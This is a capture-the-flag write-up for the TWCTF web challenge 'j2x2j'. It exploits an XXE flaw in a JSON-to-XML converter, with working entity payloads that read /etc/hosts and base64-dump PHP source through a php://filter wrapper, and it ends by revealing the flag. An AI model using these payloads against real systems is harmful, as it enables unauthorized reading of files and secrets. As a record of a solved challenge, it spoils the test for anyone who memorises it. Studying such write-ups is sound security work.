# j2x2j(Web) - Writeup

## Question

````
Here is useful tool for you.
````

## Answer

When the specified URL is accessed, a site that converts the JSON format to XML format is displayed.
Since the data input of the XML format is allowed to confirm the vulnerability XXE (XML External Entity).

If you check XXE in the XML input field, you can see that there is a vulnerability.
(So far, people from the same team have noticed.)

#### Request

````
<!DOCTYPE name [ 
<!ENTITY h SYSTEM "file:///etc/hosts">
]>
<message>&h;</message>
````

#### Responce

````
{
    "0": "127.0.0.1 localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1 ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\nff02::3 ip6-allhosts\n169.254.169.254 metadata.google.internal metadata\n"
}
````

After this, check the contents of the local file.
If you check nginx.conf, files that are missing or cannot be accessed by the www-data user will be responded with failed to decode xml.

Find out and use php Wrapper.

#### Request

````
<!DOCTYPE name [
<!ENTITY h SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<name>&h;</name>
````

#### Responce

````
{
    "0": "PD9waHAKaW5jbHVkZSAnZmxhZy5waHAnOwoKJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOwoKZnVuY3Rpb24gZGllNDA0KCRtc2cpIHsKICBodHRwX3Jlc3BvbnNlX2NvZGUoNDA0KTsKICBkaWUoJG1zZyk7Cn0KCmZ1bmN0aW9uIGNoZWNrX3R5cGUoJG9iaikgewogIGlmIChpc19hcnJheSgkb2JqKSkgewogICAgJGtleV9pc19zdHIgPSBmdW5jdGlvbigkb2JqKSB7CiAgICAgIGZvcmVhY2goJG9iaiBhcyAka2V5PT4kdmFsKSB7CiAgICAgICAgaWYgKGlzX2ludCgka2V5KSkKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgICByZXR1cm4gdHJ1ZTsKICAgIH07CiAgICAKICAgIGlmICgka2V5X2lzX3N0cigkb2JqKSkgewogICAgICByZXR1cm4gJ29iamVjdCc7CiAgICB9CiAgICBlbHNlIHsKICAgICAgcmV0dXJuICdhcnJheSc7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGdldHR5cGUoJG9iaik7CiAgfQp9CgpmdW5jdGlvbiBqc29uMnhtbCgkb2JqKSB7CiAgJHJlcyA9ICcnOwogCiAgaWYgKGlzX2FycmF5KCRvYmopKSB7CiAgICBmb3JlYWNoKCRvYmogYXMgJGtleSA9PiAkdmFsKSB7CiAgICAgIHN3aXRjaChjaGVja190eXBlKCR2YWwpKSB7CiAgICAgICAgY2FzZSAnYXJyYXknOgogICAgICAgICAgZm9yZWFjaCgkdmFsIGFzICR2KSB7CiAgICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAgICRyZXMgLj0ganNvbjJ4bWwoJHYpOwogICAgICAgICAgICAkcmVzIC49ICI8LyRrZXk+IjsKICAgICAgICAgIH0KICAgICAgICAgIGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IC8vIG9iamVjdCBvciBwcmltaXRpdmUKICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAkcmVzIC49IGpzb24yeG1sKCR2YWwpOwogICAgICAgICAgJHJlcyAuPSAiPC8ka2V5PiI7CiAgICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogIH0KICBlbHNlIHsKICAgICRyZXMgPSAoc3RyaW5nKSRvYmo7CiAgfQogIHJldHVybiAkcmVzOwp9CgoKaWYgKCRtZXRob2QgPT09ICdQT1NUJykgewogICRqc29uc3RyID0gJF9QT1NUWydqc29uJ107CiAgJHhtbHN0ciA9ICRfUE9TVFsneG1sJ107CgogIGlmICghKGVtcHR5KCR4bWxzdHIpIF4gZW1wdHkoJGpzb25zdHIpKSkgewogICAgZGllNDA0KCc0MDQnKTsKICB9CgogIGlmICghZW1wdHkoJGpzb25zdHIpKSB7CiAgICAkb2JqID0ganNvbl9kZWNvZGUoJGpzb25zdHIsIHRydWUpOwogICAgaWYgKGVtcHR5KCRvYmopKSB7CiAgICAgIGRpZSgnZmFpbGVkIHRvIGRlY29kZSBqc29uJyk7CiAgICB9CiAgICAkZG9jID0gbmV3IERPTURvY3VtZW50KCcxLjAnKTsKICAgICRkb2MtPmZvcm1hdE91dHB1dCA9IHRydWU7CiAgICAkX29iaiA9IGFycmF5KCk7CiAgICAkX29ialsncm9vdCddID0gJG9iajsKICAgICRkb2MtPmxvYWRYTUwoanNvbjJ4bWwoJF9vYmopKTsKICAgIGVjaG8gJGRvYy0+c2F2ZVhNTCgpOwogIH0KCiAgaWYgKCFlbXB0eSgkeG1sc3RyKSkgewogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiAgICAkb2JqID0gc2ltcGxleG1sX2xvYWRfc3RyaW5nKCR4bWxzdHIsICdTaW1wbGVYTUxFbGVtZW50JywgTElCWE1MX05PRU5UKTsKICAgIGlmIChlbXB0eSgkb2JqKSkgewogICAgICBkaWUoJ2ZhaWxlZCB0byBkZWNvZGUgeG1sJyk7CiAgICB9CiAgICBlY2hvIGpzb25fZW5jb2RlKCRvYmosIEpTT05fUFJFVFRZX1BSSU5UKTsKICB9Cn0KZWxzZSB7Cj8+CjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDx0aXRsZT5KU09OIDwtPiBYTUwgQ29udmVydGVyPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8dGV4dGFyZWEgaWQ9Impzb24iIG5hbWU9Impzb24iIHJvd3M9IjUwIiBjb2xzPSI4MCI+CiAgICA8L3RleHRhcmVhPgoKICAgIDxpbnB1dCB0eXBlPSJidXR0b24iIGlkPSJ4MmoiIHZhbHVlPSI8LSIvPgogICAgPGlucHV0IHR5cGU9ImJ1dHRvbiIgaWQ9ImoyeCIgdmFsdWU9Ii0+Ii8+CgogICAgPHRleHRhcmVhIGlkPSJ4bWwiIG5hbWU9InhtbCIgcm93cz0iNTAiIGNvbHM9IjgwIj4KICAgIDwvdGV4dGFyZWE+CgogICAgPHNjcmlwdAogICAgICBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5taW4uanMiCiAgICAgIGludGVncml0eT0ic2hhMjU2LWh3ZzRnc3hnRlpoT3NFRWFtZE9ZR0JmMTNGeVF1aVR3bEFRZ3hWU05ndDQ9IgogICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICAgICQuZ2V0KCcvc2FtcGxlLmpzb24nLCBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgIH0sICd0ZXh0Jyk7CgogICAgICAkKCcjajJ4Jykub24oJ2NsaWNrJywgZnVuY3Rpb24oKSB7CiAgICAgICAgJC5wb3N0KCcvJywgewogICAgICAgICAganNvbjogJCgnI2pzb24nKS52YWwoKQogICAgICAgIH0sIGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICQoJyN4bWwnKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwoKICAgICAgJCgnI3gyaicpLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewogICAgICAgICQucG9zdCgnLycsIHsKICAgICAgICAgIHhtbDogJCgnI3htbCcpLnZhbCgpCiAgICAgICAgfSwgZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgPC9zY3JpcHQ+CiAgPC9ib2R5Pgo8L2h0bWw+Cjw\/cGhwCn0K"
}
````



The source of index.php can be extracted. Because there is description of flag.php, it extracts similarly.

#### Request

````
<!DOCTYPE name [
<!ENTITY h SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<name>&h;</name>
````

#### Responce

````
{
    "0": "PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK"
}
````


Decode with base64.

````
root@kali:~# echo -n "PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK" | base64 -d
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
````

###### TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}
